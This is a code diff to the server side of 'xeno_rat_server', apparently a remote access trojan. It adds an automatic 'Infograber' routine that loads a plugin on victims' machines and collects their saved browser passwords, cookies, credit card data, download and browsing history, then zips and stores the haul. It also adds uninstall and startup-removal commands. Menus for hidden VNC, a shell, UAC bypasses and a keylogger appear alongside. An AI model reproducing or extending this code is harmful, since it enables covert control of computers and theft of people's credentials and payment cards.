@@ -24,6 +24,8 @@ using System.Drawing.Imaging;
 using Newtonsoft.Json;
 using System.Reflection.Emit;
 using Newtonsoft.Json.Linq;
+using xeno_rat_server.Forms;
+using System.IO.Compression;
 
 namespace xeno_rat_server
 {
@@ -55,9 +57,10 @@ namespace xeno_rat_server
             Power[0] = "Shutdown";
             Power[1] = "Restart";
 
-            string[] Client = new string[2];
+            string[] Client = new string[3];
             Client[0] = "Close";
             Client[1] = "Relaunch";
+            Client[2] = "Uninstall";
 
             string[] Surveillance = new string[6];
             Surveillance[0] = "Hvnc";
@@ -73,7 +76,7 @@ namespace xeno_rat_server
             Fun[2] = "Message Box";
             Fun[3] = "Fun Menu";
 
-            string[] System = new string[7];
+            string[] System = new string[8];
             System[0] = "Reverse proxy";
             System[1] = "Process Manager";
             System[2] = "File Manager";
@@ -81,6 +84,7 @@ namespace xeno_rat_server
             System[4] = "Shell";
             System[5] = "InfoGrab";
             System[6] = "Startup";
+            System[7] = "Remove Startup";
 
 
             string[] Uac_Bypass = new string[3];
@@ -170,6 +174,97 @@ namespace xeno_rat_server
                         await subClient.SendAsync(new byte[] { 1 });
                         await Task.Delay(500);
                         subClient.Disconnect();
+                    }
+                    else if (i == "Infograber") 
+                    {
+                        Node subClient = await client.CreateSubNodeAsync(2);
+                        bool worked = await Utils.LoadDllAsync(subClient, "InfoGrab", File.ReadAllBytes("plugins\\InfoGrab.dll"), AddLog);
+                        if (!worked)
+                        {
+                            continue;
+                        }
+                        string cookies = "";
+                        string passwords = "";
+                        string ccs = "";
+                        string history = "";
+                        string downloads = "";
+                        await subClient.SendAsync(new byte[] { 0 });
+                        byte[] data = await subClient.ReceiveAsync();
+                        if (data == null) 
+                        {
+                            goto end;
+                        }
+                        var loginlist = InfoGrab.DeserializeLoginList(data);
+                        for (int x = 0; x < loginlist.Count; x++) 
+                        {
+                            passwords+=loginlist[x].ToString() + "\n";
+                        }
+                        await subClient.SendAsync(new byte[] { 1 });
+                        data = await subClient.ReceiveAsync();
+                        if (data == null)
+                        {
+                            goto end;
+                        }
+                        var cookielist = InfoGrab.DeserializeCookieList(data);
+                        for (int x = 0; x < cookielist.Count; x++)
+                        {
+                            cookies += cookielist[x].ToString() + "\n";
+                        }
+                        await subClient.SendAsync(new byte[] { 2 });
+                        data = await subClient.ReceiveAsync();
+                        if (data == null)
+                        {
+                            goto end;
+                        }
+                        var cclist = InfoGrab.DeserializeCreditCardList(data);
+                        for (int x = 0; x < cclist.Count; x++)
+                        {
+                            ccs += cclist[x].ToString() + "\n";
+                        }
+                        await subClient.SendAsync(new byte[] { 3 });
+                        data = await subClient.ReceiveAsync();
+                        if (data == null)
+                        {
+                            goto end;
+                        }
+                        var downloadlist = InfoGrab.DeserializeDownloadList(data);
+                        for (int x = 0; x < downloadlist.Count; x++)
+                        {
+                            downloads += downloadlist[x].ToString() + "\n";
+                        }
+                        await subClient.SendAsync(new byte[] { 4 });
+                        data = await subClient.ReceiveAsync();
+                        if (data == null)
+                        {
+                            goto end;
+                        }
+                        var historylist=InfoGrab.DeserializeWebHistoryList(data);
+                        for (int x = 0; x < historylist.Count; x++)
+                        {
+                            history += historylist[x].ToString() + "\n";
+                        }
+                        end:
+                        subClient.Disconnect();
+
+                        using (MemoryStream memoryStream = new MemoryStream())
+                        {
+                            using (ZipArchive archive = new ZipArchive(memoryStream, ZipArchiveMode.Create, true))
+                            {
+                                Utils.AddTextToZip(archive, "cookies.txt", cookies);
+                                Utils.AddTextToZip(archive, "passwords.txt", passwords);
+                                Utils.AddTextToZip(archive, "ccs.txt", ccs);
+                                Utils.AddTextToZip(archive, "history.txt", history);
+                                Utils.AddTextToZip(archive, "downloads.txt", downloads);
+                            }
+                            byte[] zipData = memoryStream.ToArray();
+                            string directory = "OnConnectInfoGrabbedData";
+                            string path=Path.Combine(new string[] { directory, DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString()+"- InfoGrab.zip" });
+                            if (!Directory.Exists(directory)) 
+                            { 
+                                Directory.CreateDirectory(directory);
+                            }
+                            File.WriteAllBytes(path, zipData);
+                        } 
                     }
                 }
                 catch 
@@ -945,6 +1040,7 @@ namespace xeno_rat_server
                     MessageBox.Show("Error Starting Startup dll!");
                     return;
                 }
+                await subClient.SendAsync(new byte[] { 0 });
                 bool Startupworked=(await subClient.ReceiveAsync())[0]==1;
                 if (Startupworked)
                 {
@@ -961,6 +1057,27 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Startup dll!");
             }
         }
+        private async Task StartRemoveStartup(Node client)
+        {
+            try
+            {
+                Node subClient = await client.CreateSubNodeAsync(2);
+                bool worked = await Utils.LoadDllAsync(subClient, "Startup", File.ReadAllBytes("plugins\\Startup.dll"), AddLog);
+                if (!worked)
+                {
+                    MessageBox.Show("Error Starting Startup dll!");
+                    return;
+                }
+                await subClient.SendAsync(new byte[] { 1 });
+                MessageBox.Show("Startup removed!");
+                subClient.Disconnect();
+            }
+            catch
+            {
+                MessageBox.Show("Error with Startup dll!");
+            }
+            
+        }
         private async Task StartClose(Node client) 
         {
             await client.SendAsync(new byte[] { 2 });
@@ -970,6 +1087,12 @@ namespace xeno_rat_server
         private async Task StartRelaunch(Node client)
         {
             await client.SendAsync(new byte[] { 3 });
+            await Task.Delay(1000);
+            client.Disconnect();
+        }
+        private async Task StartUninstall(Node client)
+        {
+            await client.SendAsync(new byte[] { 4 });
             await Task.Delay(1000);
             client.Disconnect();
         }
@@ -1083,7 +1206,7 @@ namespace xeno_rat_server
             {
                 StartPlugin(StartCmstpUacBypass, client);
             }
-            else if (command == "Fodhelper") 
+            else if (command == "Fodhelper")
             {
                 StartPlugin(StartFodHelperBypass, client);
             }
@@ -1111,6 +1234,10 @@ namespace xeno_rat_server
             {
                 StartPlugin(StartStartup, client);
             }
+            else if (command == "Remove Startup") 
+            {
+                StartPlugin(StartRemoveStartup, client);
+            }
             else if (command == "Close")
             {
                 StartPlugin(StartClose, client);
@@ -1118,6 +1245,11 @@ namespace xeno_rat_server
             else if (command == "Relaunch")
             {
                 StartPlugin(StartRelaunch, client);
+            }
+            else if (command == "Uninstall")
+            {
+                StartPlugin(StartUninstall, client);
+
             }
             else if (command == "Shutdown")
             {
@@ -1416,6 +1548,7 @@ namespace xeno_rat_server
                 string[] contextMenuItems = new string[]
                 {
                     "Start OfflineKeylogger",
+                    "Infograber",
                 };
 
                 foreach (string menuItemText in contextMenuItems)
